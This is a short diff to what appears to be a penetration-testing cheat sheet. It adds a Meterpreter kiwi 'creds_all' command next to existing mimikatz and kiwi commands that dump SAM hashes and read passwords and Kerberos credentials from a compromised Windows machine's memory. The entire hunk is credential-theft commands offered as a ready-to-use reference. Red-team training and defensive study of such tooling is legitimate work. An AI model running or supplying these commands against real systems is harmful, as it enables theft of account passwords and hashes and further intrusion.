@@ -13,6 +13,10 @@ mimikatz_command -f sekurlsa::searchPasswords
 load kiwi
 lsa_dump_sam
 
+# All creds (module kiwi)
+load kiwi
+creds_all
+
 # Reading Hashes and Passwords from Memory
 meterpreter > msv
 meterpreter > kerberos
